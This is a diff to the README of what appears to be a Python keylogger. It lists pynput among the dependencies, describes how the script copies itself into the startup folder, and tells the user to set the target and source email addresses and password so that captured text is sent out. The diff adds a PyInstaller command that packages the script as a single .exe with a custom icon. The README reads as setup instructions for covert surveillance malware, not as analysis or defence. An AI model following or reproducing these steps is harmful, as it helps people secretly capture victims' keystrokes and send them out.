@@ -9,11 +9,10 @@ The script first checks if a python script/exe exists in the start up directory 
 <ul>
 <li>Schedule</li>
 <li>Pynput</li>
+<li>PyInstaller</li>
 </ul>
 To Download them use the command: pip install -r requirements.
 <h2>Changes that you should make.</h2>
 <b>First of all change file type to .exe in the part of the code where it copies itself to the startup folder</b>.Optionally you can change the location of the text file.Also change the target email and source email address and password.
-
-
-
-
+To convert the pyw/py to .exe use the command<b>pyinstaller --onefile  --icon=favicon.ico Whosit.pyw</b>
+ 
